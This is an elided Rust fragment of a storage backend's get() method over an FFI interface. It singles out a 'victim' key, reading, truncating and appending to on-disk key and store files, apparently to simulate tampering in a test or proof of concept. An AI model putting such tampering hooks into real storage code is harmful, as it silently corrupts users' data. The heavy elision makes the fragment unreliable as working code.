...
impl Storage for DB {
    fn get(&self, key: &[u8]) -> FfiResult<Option<Vec<u8>>> {
        ...
        let input = File::open(&victim_key_path).unwrap();
        ...
        let value = if result_buf.ptr.is_null() || hex::encode(key) == victim_key {
            ...
            let mut f = std::fs::OpenOptions::new().write(true).truncate(true).open(&victim_key_path).unwrap();
            ...
            let mut f = std::fs::OpenOptions::new().write(true).append(true).open(&kv_store_path).unwrap();
